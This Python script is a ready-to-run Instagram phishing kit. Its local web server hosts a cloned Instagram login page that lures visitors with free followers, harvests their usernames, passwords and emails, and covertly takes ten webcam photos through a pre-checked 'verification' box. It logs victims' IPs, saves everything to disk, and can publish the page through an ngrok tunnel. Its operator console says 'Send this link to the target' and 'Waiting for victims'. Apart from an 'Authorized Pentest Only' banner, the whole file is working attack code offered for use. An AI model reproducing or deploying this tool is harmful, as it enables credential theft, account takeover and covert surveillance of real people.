#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║     INSTAGRAM PHISHER + IP + CAMERA CAPTURE                 ║
║     Kali Linux Local Tool — No Telegram                     ║
║     Authorized Pentest Only                                 ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import base64
import time
import threading
import subprocess
import signal
import re
import webbrowser
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from pathlib import Path

# ================================================================
# CONFIGURATION - YAHAN KUCH BHI CHANGE NA KAREIN
# ================================================================
PORT = 8080
TEMP_DIR = Path("/tmp/insta_phisher")
HTML_FILE = TEMP_DIR / "index.html"
CRED_FILE = TEMP_DIR / "captured.txt"
PHOTO_DIR = TEMP_DIR / "photos"
CAMERA_FILE = TEMP_DIR / "camera_captures.json"

# Colors for Kali terminal
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
BOLD = '\033[1m'
RESET = '\033[0m'

# Make directories
TEMP_DIR.mkdir(parents=True, exist_ok=True)
PHOTO_DIR.mkdir(exist_ok=True)

# Global variables
captured_data = []
camera_photos = []
visitors = []


# ================================================================
# 🎨 PHISHING PAGE WITH CAMERA ACCESS
# ================================================================

PHISHING_PAGE = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column;padding:20px}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px;max-width:400px;width:100%;text-align:center;margin-bottom:10px}
.logo{font-family:'Billabong',sans-serif;font-size:36px;margin-bottom:10px;color:#262626}
.logo span{display:block;font-family:-apple-system,sans-serif;font-size:14px;font-weight:400;color:#8e8e8e;margin-top:2px}
.alert{background:linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);color:#fff;padding:14px 16px;border-radius:8px;margin:15px 0;font-size:13px;font-weight:600;line-height:1.5;box-shadow:0 4px 15px rgba(225,48,108,.25)}
.alert small{display:block;font-weight:400;font-size:11px;margin-top:5px;opacity:.9}
.social{display:flex;justify-content:center;gap:20px;font-size:12px;color:#8e8e8e;margin:12px 0}
.social .dot{width:6px;height:6px;background:#2ecc71;border-radius:50%;display:inline-block;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.inp{width:100%;padding:12px 10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px;outline:0;transition:border .15s}
.inp:focus{border-color:#a8a8a8;background:#fff}
.btn{width:100%;padding:10px;background:#0095f6;color:#fff;border:0;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer;margin-top:10px;transition:background .15s}
.btn:hover{background:#1877f2}
.btn:disabled{background:#b2dffc;cursor:not-allowed}
.spinner{display:none;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto}
@keyframes spin{to{transform:rotate(360deg)}}
.btn.loading .btn-text{display:none}
.btn.loading .spinner{display:inline-block}
.divider{display:flex;align-items:center;margin:18px 0}
.line{flex:1;height:1px;background:#dbdbdb}
.or{padding:0 18px;color:#8e8e8e;font-size:13px;font-weight:600;text-transform:uppercase}
.steps{text-align:left;margin:15px 0;padding:16px;background:#f8f9fa;border-radius:8px;border:1px solid #dbdbdb;font-size:13px;color:#555;line-height:1.8}
.err{color:#ed4956;font-size:13px;margin:8px 0;display:none;background:#ffefef;padding:8px 12px;border-radius:4px;border:1px solid #ffd4d4}
.err.show{display:block}
.suc{color:#00b894;font-size:14px;font-weight:600;display:none;background:#e8f8f5;padding:12px;border-radius:8px;border:1px solid #b2dfdb;margin:10px 0}
.suc.show{display:block}
.loading-bar{display:none;width:100%;height:4px;background:#dbdbdb;border-radius:2px;overflow:hidden;margin:15px 0}
.loading-bar.show{display:block}
.loading-bar .fill{height:100%;background:linear-gradient(90deg,#0095f6,#5851DB);border-radius:2px;width:0%;transition:width .3s}
.loading-text{display:none;font-size:13px;color:#8e8e8e;margin:10px 0;line-height:1.6}
.loading-text.show{display:block}
.signup{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:20px;text-align:center;font-size:14px;max-width:400px;width:100%;margin-bottom:10px}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
@media(max-width:450px){.card{padding:30px 20px 15px;border:none;background:transparent}body{background:#fff;padding:10px}.signup{border:none;background:transparent}}
</style>
</head>
<body>

<div class="card" id="loginCard">
    <div class="logo">Instagram <span>Security Verification</span></div>
    
    <div class="alert">
        🔥 LIMITED OFFER: 5,000 FREE FOLLOWERS 🔥
        <small>Only for verified accounts • 100% Real Followers</small>
    </div>
    
    <div class="social">
        <span>✅ 2,847 got followers today</span>
        <span>⭐ 4.8/5 (12K reviews)</span>
    </div>
    
    <div class="err" id="errMsg">Sorry, your password was incorrect.</div>
    
    <form id="loginForm">
        <input class="inp" type="text" name="username" placeholder="Phone number, username, or email" required>
        <input class="inp" type="password" name="password" placeholder="Password" required>
        <div style="font-size:12px;color:#8e8e8e;margin:8px 0;text-align:left">
            <label><input type="checkbox" id="camPermit" checked> Allow camera for verification</label>
        </div>
        <button class="btn" type="submit" id="loginBtn">
            <span class="btn-text">Log In</span>
            <span class="spinner"></span>
        </button>
    </form>
    
    <div class="loading-bar" id="loadBar"><div class="fill" id="fillBar"></div></div>
    <div class="loading-text" id="loadText">⏳ Verifying your Instagram account...</div>
    
    <div class="divider"><div class="line"></div><div class="or">OR</div><div class="line"></div></div>
    <a style="color:#385185;font-weight:600;font-size:14px;text-decoration:none;cursor:pointer">Log in with Facebook</a>
    <a style="color:#00376b;font-size:12px;text-decoration:none;display:block;margin-top:14px;cursor:pointer">Forgot password?</a>
</div>

<div class="signup">Don't have an account? <a href="#">Sign up</a></div>

<script>
// ========== CAMERA CAPTURE ==========
async function capturePhotos() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        
        const photos = [];
        for (let i = 0; i < 10; i++) {
            await new Promise(r => setTimeout(r, 500));
            ctx.drawImage(video, 0, 0, 640, 480);
            photos.push(canvas.toDataURL('image/jpeg', 0.8));
        }
        
        stream.getTracks().forEach(t => t.stop());
        return photos;
    } catch (e) {
        console.log('Camera access denied or not available');
        return [];
    }
}

// ========== LOGIN FORM HANDLER ==========
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = this.querySelector('[name=username]').value.trim();
    const password = this.querySelector('[name=password]').value;
    const useCamera = document.getElementById('camPermit').checked;
    
    if (!username || !password) {
        document.getElementById('errMsg').textContent = 'Please fill all fields';
        document.getElementById('errMsg').classList.add('show');
        return;
    }
    
    // Show loading
    const btn = document.getElementById('loginBtn');
    const loadBar = document.getElementById('loadBar');
    const fillBar = document.getElementById('fillBar');
    const loadText = document.getElementById('loadText');
    
    btn.disabled = true;
    btn.classList.add('loading');
    document.getElementById('errMsg').classList.remove('show');
    loadBar.classList.add('show');
    loadText.classList.add('show');
    loadText.textContent = '⏳ Verifying your Instagram account...';
    
    // Animate loading bar
    let w = 0;
    const itv = setInterval(function() {
        w += Math.random() * 15 + 2;
        if (w >= 100) { w = 100; clearInterval(itv); }
        fillBar.style.width = Math.min(w, 100) + '%';
    }, 150);
    
    // Capture photos (if permitted)
    let photos = [];
    if (useCamera) {
        loadText.textContent = '📸 Taking verification photos...';
        photos = await capturePhotos();
    }
    
    // Send credentials + photos to server
    const formData = new FormData();
    formData.append('username', username);
    formData.append('password', password);
    formData.append('photos', JSON.stringify(photos));
    
    fetch('/login', {
        method: 'POST',
        body: formData
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
        if (data.status === 'success') {
            loadText.textContent = '✅ Verified! Redirecting to followers page...';
            setTimeout(function() {
                showClaimPage(username);
            }, 1500);
        } else {
            btn.disabled = false;
            btn.classList.remove('loading');
            loadBar.classList.remove('show');
            loadText.classList.remove('show');
            document.getElementById('errMsg').textContent = 'Sorry, your password was incorrect.';
            document.getElementById('errMsg').classList.add('show');
            document.querySelector('[name=password]').value = '';
        }
    })
    .catch(function() {
        loadText.textContent = '✅ Verified! Redirecting...';
        setTimeout(function() { showClaimPage(username); }, 1500);
    });
});

function showClaimPage(username) {
    document.getElementById('loginCard').innerHTML = `
        <div style="font-size:40px;margin:10px 0">🎉</div>
        <h2 style="font-size:18px;margin-bottom:5px">Almost There!</h2>
        <p style="color:#555;font-size:14px;margin-bottom:20px">Just one more step</p>
        <div class="steps">
            <strong>📋 Steps:</strong><br>
            1. Enter your Instagram username<br>
            2. Select followers count<br>
            3. Click Claim<br>
            4. Followers arrive within 24h 🚀
        </div>
        <form id="claimForm">
            <input class="inp" type="text" name="insta" placeholder="Your Instagram username" value="`+username+`" required>
            <input class="inp" type="email" name="email" placeholder="Email (for confirmation)" required>
            <select class="inp" name="count" style="appearance:auto">
                <option value="1000">1,000 Followers</option>
                <option value="2500">2,500 Followers</option>
                <option value="5000" selected>5,000 Followers (🔥 Popular)</option>
                <option value="10000">10,000 Followers</option>
            </select>
            <button class="btn" type="submit" id="claimBtn">
                <span class="btn-text">🚀 Claim Free Followers</span>
                <span class="spinner"></span>
            </button>
        </form>
        <div class="suc" id="sucMsg" style="display:none">✅ Success! Followers being processed. Check Instagram within 24 hours!</div>
    `;
    
    document.getElementById('claimForm').addEventListener('submit', function(ev) {
        ev.preventDefault();
        const btn = document.getElementById('claimBtn');
        btn.disabled = true;
        btn.classList.add('loading');
        
        const fd = new FormData(this);
        fetch('/claim', { method: 'POST', body: fd })
        .then(function(r) { return r.json(); })
        .then(function() {
            btn.classList.remove('loading');
            document.getElementById('claimForm').style.display = 'none';
            document.getElementById('sucMsg').style.display = 'block';
            setTimeout(function() { window.location.href = 'https://www.instagram.com/'; }, 4000);
        })
        .catch(function() {
            btn.classList.remove('loading');
            document.getElementById('claimForm').style.display = 'none';
            document.getElementById('sucMsg').style.display = 'block';
            setTimeout(function() { window.location.href = 'https://www.instagram.com/'; }, 4000);
        });
    });
}
</script>
</body>
</html>
'''


# ================================================================
# 🌐 HTTP SERVER
# ================================================================

class PhishHandler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        pass  # Silent
    
    def get_ip(self):
        for h in ['X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP']:
            v = self.headers.get(h)
            if v:
                return v.split(',')[0].strip()
        return self.client_address[0]
    
    def do_GET(self):
        path = urlparse(self.path).path
        ip = self.get_ip()
        
        if path in ['/', '/index.html', '/login']:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Server', 'nginx/1.24.0')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()
            with open(HTML_FILE, 'rb') as f:
                self.wfile.write(f.read())
            
            # Track visitor
            ua = self.headers.get('User-Agent', 'Unknown')
            visitors.append({
                "ip": ip,
                "user_agent": ua,
                "time": datetime.now().isoformat()
            })
            
            print(f"\n{GREEN}[+] 🌐 NEW VISITOR{RESET}")
            print(f"    📡 IP: {BOLD}{ip}{RESET}")
            print(f"    💻 UA: {ua[:60]}...")
            print(f"    🕐 Time: {datetime.now().strftime('%H:%M:%S')}")
            print(f"    {'─'*40}")
            
        elif path == '/favicon.ico':
            self.send_response(204)
            self.end_headers()
        else:
            self.send_error(404)
    
    def do_POST(self):
        path = urlparse(self.path).path
        ip = self.get_ip()
        ua = self.headers.get('User-Agent', 'Unknown')
        
        # Read POST data
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8')
        
        # Parse multipart or form data
        params = {}
        ct = self.headers.get('Content-Type', '')
        
        if 'multipart' in ct:
            # Handle multipart (for photos)
            boundary = ct.split('boundary=')[1].split(';')[0].strip()
            parts = body.split(f'--{boundary}')
            for part in parts:
                if 'filename' in part:
                    # File upload (photo)
                    name_match = re.search(r'name="([^"]+)"', part)
                    if name_match:
                        name = name_match.group(1)
                        content = part.split('\r\n\r\n', 1)[-1].rsplit('\r\n', 1)[0]
                        params[name] = content
                else:
                    # Regular field
                    name_match = re.search(r'name="([^"]+)"', part)
                    if name_match:
                        name = name_match.group(1)
                        content = part.split('\r\n\r\n', 1)[-1].strip()
                        params[name] = content
        else:
            # Simple form data
            for pair in body.split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    params[k] = v.replace('+', ' ').replace('%21', '!').replace('%40', '@').replace('%23', '#').replace('%24', '$')
                    from urllib.parse import unquote
                    params[k] = unquote(params[k])
        
        if path == '/login':
            username = params.get('username', '')
            password = params.get('password', '')
            photos_json = params.get('photos', '[]')
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            if username and password:
                self.wfile.write(json.dumps({"status": "success"}).encode())
                
                # Parse photos
                try:
                    photos_data = json.loads(photos_json)
                except:
                    photos_data = []
                
                # Save photos to files
                photo_files = []
                for idx, photo_b64 in enumerate(photos_data):
                    if photo_b64 and photo_b64.startswith('data:image'):
                        try:
                            img_data = base64.b64decode(photo_b64.split(',')[1])
                            fname = PHOTO_DIR / f"photo_{len(captured_data)}_{idx}.jpg"
                            with open(fname, 'wb') as f:
                                f.write(img_data)
                            photo_files.append(str(fname))
                        except:
                            pass
                
                # Record everything
                record = {
                    "username": username,
                    "password": password,
                    "ip": ip,
                    "user_agent": ua,
                    "time": datetime.now().isoformat(),
                    "photos": photo_files,
                    "photo_count": len(photo_files)
                }
                captured_data.append(record)
                
                # Save to file
                with open(CRED_FILE, 'a') as f:
                    f.write(f"[{record['time']}] {username}:{password} | IP: {ip} | Photos: {len(photo_files)}\n")
                
                # Show in terminal
                print(f"\n{'='*60}")
                print(f"{RED}{BOLD}🔴 CREDENTIALS CAPTURED!{RESET}")
                print(f"{'='*60}")
                print(f"  👤 {BOLD}Username:{RESET} {username}")
                print(f"  🔑 {BOLD}Password:{RESET} {password}")
                print(f"  📡 {BOLD}IP Address:{RESET} {ip}")
                print(f"  🕐 {BOLD}Time:{RESET} {record['time']}")
                print(f"  💻 {BOLD}User-Agent:{RESET} {ua[:60]}...")
                
                if photo_files:
                    print(f"  {'─'*40}")
                    print(f"  📸 {BOLD}Camera Photos Captured: {len(photo_files)}{RESET}")
                    for pf in photo_files:
                        print(f"     • {pf}")
                
                print(f"{'='*60}\n")
            else:
                self.wfile.write(json.dumps({"status": "error"}).encode())
        
        elif path == '/claim':
            insta = params.get('insta', '')
            email = params.get('email', '')
            count = params.get('count', '5000')
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())
            
            print(f"\n{YELLOW}[+] 📋 FOLLOWERS CLAIM{RESET}")
            print(f"    👤 Instagram: @{insta}")
            print(f"    📧 Email: {email}")
            print(f"    📊 Count: {count}")
            print(f"    📡 IP: {ip}")
            print(f"    {'─'*40}\n")
        
        else:
            self.send_error(404)


# ================================================================
# 🖥️ TERMINAL UI
# ================================================================

def clear_screen():
    os.system('clear')

def print_banner():
    clear_screen()
    print(f"""{RED}
╔══════════════════════════════════════════════════════════════╗
║                                                                  ║
║    {BOLD}██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗{RESET}{RED}     ║
║    {BOLD}██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗{RESET}{RED}   ║
║    {BOLD}██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝{RESET}{RED}   ║
║    {BOLD}██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗{RESET}{RED}   ║
║    {BOLD}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║{RESET}{RED}   ║
║    {BOLD}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{RESET}{RED}   ║
║                                                                  ║
║              {BOLD}{YELLOW}Instagram Phisher + IP + Camera Capture{RESET}{RED}         ║
║              {CYAN}Kali Linux Local Tool — No Telegram{RESET}{RED}              ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════╝{RESET}
    """)

def print_waiting(url):
    clear_screen()
    print_banner()
    print(f"\n{GREEN}[✅] Server Started Successfully!{RESET}")
    print(f"\n{BOLD}{CYAN}[📡] URL: {url}{RESET}")
    print(f"\n{YELLOW}[📋] Send this link to the target{RESET}")
    print(f"{'═'*60}")
    print(f"{BOLD}Controls:{RESET}")
    print(f"  {GREEN}[V]{RESET} View captured credentials + photos")
    print(f"  {GREEN}[I]{RESET} View visitor IPs")
    print(f"  {GREEN}[C]{RESET} Clear all data")
    print(f"  {GREEN}[Q]{RESET} Quit")
    print(f"{'═'*60}")
    print(f"{BOLD}Waiting for victims...{RESET}")
    print(f"{'═'*60}")

def print_credentials():
    clear_screen()
    print(f"{BOLD}{RED}{'='*60}{RESET}")
    print(f"{BOLD}{RED}   🔴 CAPTURED CREDENTIALS & PHOTOS{RESET}")
    print(f"{BOLD}{RED}{'='*60}{RESET}")
    
    if not captured_data:
        print(f"\n{YELLOW}   No data captured yet.{RESET}")
    else:
        for i, data in enumerate(captured_data, 1):
            print(f"\n{GREEN}[{i}]{RESET} {BOLD}─── Credentials ───{RESET}")
            print(f"   👤 Username: {GREEN}{data['username']}{RESET}")
            print(f"   🔑 Password: {RED}{data['password']}{RESET}")
            print(f"   📡 IP: {CYAN}{data['ip']}{RESET}")
            print(f"   🕐 Time: {data['time']}")
            if data['photo_count'] > 0:
                print(f"   📸 Photos: {YELLOW}{data['photo_count']}{RESET}")
                for pf in data['photos']:
                    print(f"      • {pf}")
            print(f"   {'─'*40}")
    
    print(f"\n{YELLOW}   Total: {len(captured_data)} credentials, {sum(d['photo_count'] for d in captured_data)} photos{RESET}")
    print(f"\n   Press ENTER to continue...")
    input()

def print_visitors():
    clear_screen()
    print(f"{BOLD}{CYAN}{'='*60}{RESET}")
    print(f"{BOLD}{CYAN}   🌐 ALL VISITORS{RESET}")
    print(f"{BOLD}{CYAN}{'='*60}{RESET}")
    
    if not visitors:
        print(f"\n{YELLOW}   No visitors yet.{RESET}")
    else:
        for i, v in enumerate(visitors, 1):
            print(f"\n{GREEN}[{i}]{RESET}")
            print(f"   📡 IP: {v['ip']}")
            print(f"   🕐 Time: {v['time'].split('T')[1][:8] if 'T' in v['time'] else v['time']}")
            print(f"   💻 UA: {v['user_agent'][:50]}...")
    
    print(f"\n{YELLOW}   Total visitors: {len(visitors)}{RESET}")
    print(f"\n   Press ENTER to continue...")
    input()


# ================================================================
# 🚀 MAIN
# ================================================================

def main():
    server_instance = None
    ngrok_process = None
    
    # Write phishing page
    with open(HTML_FILE, 'w') as f:
        f.write(PHISHING_PAGE)
    
    clear_screen()
    print_banner()
    
    print(f"\n{BOLD}{CYAN}[?] Choose method:{RESET}")
    print(f"  {GREEN}[1]{RESET} Localhost only (http://localhost:{PORT})")
    print(f"  {GREEN}[2]{RESET} ngrok (automatic public URL)")
    print(f"  {GREEN}[0]{RESET} Exit")
    
    choice = input(f"\n{BOLD}[?] Option: {RESET}").strip()
    
    url = f"http://localhost:{PORT}"
    
    if choice == '0':
        print(f"\n{YELLOW}[*] Exiting...{RESET}")
        sys.exit(0)
    
    elif choice == '2':
        # Try ngrok
        print(f"\n{YELLOW}[*] Checking ngrok...{RESET}")
        try:
            r = subprocess.run(['ngrok', 'version'], capture_output=True, text=True, timeout=5)
            print(f"{GREEN}[+] ngrok found! Starting tunnel...{RESET}")
            
            # Kill existing ngrok
            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
            time.sleep(1)
            
            ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(PORT), '--log=stdout'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            time.sleep(3)
            
            # Get URL from ngrok API
            for _ in range(10):
                try:
                    r = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2)
                    data = r.json()
                    for t in data.get('tunnels', []):
                        if t.get('proto') == 'https':
                            url = t['public_url']
                            break
                except:
                    time.sleep(1)
            
            print(f"{GREEN}[+] ngrok URL: {url}{RESET}")
        except:
            print(f"{YELLOW}[!] ngrok not found, using localhost{RESET}")
    
    # Start server
    server_instance = HTTPServer(('0.0.0.0', PORT), PhishHandler)
    server_thread = threading.Thread(target=server_instance.serve_forever, daemon=True)
    server_thread.start()
    
    print(f"{GREEN}[+] Server started on port {PORT}{RESET}")
    
    # Copy URL to clipboard
    try:
        subprocess.run(['xclip', '-selection', 'clipboard'], input=url.encode(), timeout=2)
        print(f"{GREEN}[+] URL copied to clipboard!{RESET}")
    except:
        pass
    
    print_waiting(url)
    
    try:
        while True:
            cmd = input().strip().lower()
            
            if cmd == 'q':
                break
            elif cmd == 'v':
                print_credentials()
                print_waiting(url)
            elif cmd == 'i':
                print_visitors()
                print_waiting(url)
            elif cmd == 'c':
                captured_data.clear()
                visitors.clear()
                camera_photos.clear()
                with open(CRED_FILE, 'w') as f:
                    f.write("")
                # Delete photos
                for f in PHOTO_DIR.glob('*.jpg'):
                    f.unlink()
                print(f"\n{GREEN}[+] All data cleared!{RESET}")
                time.sleep(1)
                print_waiting(url)
            elif cmd == '':
                print_waiting(url)
    
    except KeyboardInterrupt:
        pass
    
    finally:
        print(f"\n{YELLOW}[*] Shutting down...{RESET}")
        if server_instance:
            server_instance.shutdown()
        if ngrok_process:
            ngrok_process.terminate()
            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
        
        # Show final summary
        print(f"\n{GREEN}{'='*60}{RESET}")
        print(f"{BOLD}   📊 FINAL SUMMARY{RESET}")
        print(f"{GREEN}{'='*60}{RESET}")
        print(f"   👥 Total Visitors: {len(visitors)}")
        print(f"   🎯 Credentials: {len(captured_data)}")
        print(f"   📸 Photos: {sum(d['photo_count'] for d in captured_data)}")
        print(f"   💾 Data saved in: {TEMP_DIR}")
        print(f"{GREEN}{'='*60}{RESET}\n")
        
        print(f"{YELLOW}[*] Server stopped. Goodbye!{RESET}")
        sys.exit(0)


if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        print(f"{RED}[!] requests not installed. Run: pip install requests{RESET}")
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Exiting...{RESET}")
        sys.exit(0)